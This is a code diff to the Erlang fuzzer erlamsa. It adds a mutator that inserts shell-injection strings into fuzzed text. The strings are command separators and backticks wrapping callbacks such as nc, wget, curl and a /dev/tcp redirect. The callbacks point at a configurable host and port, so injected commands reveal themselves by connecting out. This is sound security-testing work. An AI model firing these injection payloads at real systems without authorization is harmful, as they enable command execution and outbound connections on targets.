@@ -440,6 +440,21 @@ silly_strings() -> % added \r \n \t \b
 delimeters() ->
     ["'", "\"", "'", "\"", "'", "\"", "&", ":", "|", ";",
      "\\", [10], [13], [9], " ", "`", [0], "]", "[", ">", "<"].
+
+-spec shellinjects() -> list(string()).
+shellinjects() -> 
+    [
+        "';~s;'", "\";~s;\"", ";~s;", "|~s#",
+        "^ ~s ^", "& ~s &", "&& ~s &&", "|| ~s ||",
+        "%0D~s%0D", "`~s`"  
+    ].
+
+-spec revconnects() -> list(string()).
+revconnects() -> 
+    [
+        "calc.exe & notepad.exe ~s ~p ", "nc ~s ~p", "wget http://~s:~p", "curl ~s ~p",
+        "exec 3<>/dev/tcp/~s/~p", "sleep 100000 # ~s ~p "
+    ].
     
 -spec random_badness() -> list().
 random_badness() ->
@@ -485,6 +500,13 @@ push_as(N, Tail) ->
 mutate_text_data(Lst, TxtMutators) ->
     mutate_text(erlamsa_rnd:rand_elem(TxtMutators), Lst).
 
+-spec buildrevconnect() -> string().
+buildrevconnect() ->
+    Inj = erlamsa_rnd:rand_elem(shellinjects()),
+    Rev = erlamsa_rnd:rand_elem(revconnects()),
+    {IP, Port} = get_ssrf_ep(),
+    lists:flatten(io_lib:format(Inj, [io_lib:format(Rev, [IP, Port])])).
+
 -spec mutate_text(text_mutators(), string()) -> string().
 %% insert badness
 mutate_text(insert_badness, []) -> random_badness(); %% empty list -- just insert random
@@ -512,8 +534,12 @@ mutate_text(insert_delimeter, []) -> [erlamsa_rnd:rand_elem(delimeters())]; %% e
 mutate_text(insert_delimeter, Lst) ->
     P = erlamsa_rnd:erand(length(Lst)), % in erlang lists starts from 1
     Bad = erlamsa_rnd:rand_elem(delimeters()),
-    erlamsa_utils:applynth(P, Lst, fun(E, R) -> Bad ++ [E|R] end). %% TODO: check before or after E
-    
+    erlamsa_utils:applynth(P, Lst, fun(E, R) -> Bad ++ [E|R] end); %% TODO: check before or after E
+mutate_text(insert_shellinj, []) -> [erlamsa_rnd:rand_elem(delimeters())]; %% empty list -- just insert random
+mutate_text(insert_shellinj, Lst) ->
+    P = erlamsa_rnd:erand(length(Lst)), % in erlang lists starts from 1
+    ShellInj = buildrevconnect(),
+    erlamsa_utils:applynth(P, Lst, fun(E, R) -> ShellInj ++ [E|R] end).
 
 %% Generic ASCII Bad mutation
 %% In Radamsa, this function will work only if Cs started as string
@@ -582,7 +608,12 @@ string_delimeter_mutate(Cs, L, R) ->
     El = lists:nth(P, Cs),
     case El of 
         {text, Bs} -> %% insert or drop special delimeter(s)
-            Data = mutate_text_data(Bs, [insert_delimeter]),
+            Data = mutate_text_data(Bs, [erlamsa_rnd:rand_elem(
+                                            [
+                                                insert_delimeter, insert_delimeter, 
+                                                insert_delimeter, insert_shellinj                                        
+                                            ])
+                                        ]),
             erlamsa_utils:applynth(P, Cs, fun(_E, Rest) -> [{text, Data}|Rest] end); % [Node]            
         {byte, _Bs} -> %% do nothing
             string_delimeter_mutate(Cs, L, R + 1);
@@ -597,7 +628,6 @@ construct_ascii_delimeter_mutator() ->
         fun (Cs) -> string_delimeter_mutate(Cs, length(Cs), 0)
         end,
         ascii_delimeter).
-
 
 %% 
 %% Base64 Mutator
@@ -641,8 +671,8 @@ base64_mutator([H|T], Meta) ->
 %% URI SSRF Mutator
 %%
 
--spec get_ssrf_uri() -> list().
-get_ssrf_uri() -> 
+-spec get_ssrf_ep() -> {string(), integer()}.
+get_ssrf_ep() -> 
     SSRFPort = case ets:match(global_config, {cm_port, '$1'}) of
         [[Port]] -> Port;
         _ -> 51234
@@ -661,6 +691,11 @@ get_ssrf_uri() ->
         {_, SSRFUserHost} -> SSRFUserHost;
         _ -> "localhost"
     end,
+    {SSRFHost, SSRFPort}.
+
+-spec get_ssrf_uri() -> list().
+get_ssrf_uri() -> 
+    {SSRFHost, SSRFPort} = get_ssrf_ep(),
     io_lib:format("://~s:~p/", [SSRFHost, SSRFPort]).
 
 %% replace file with http
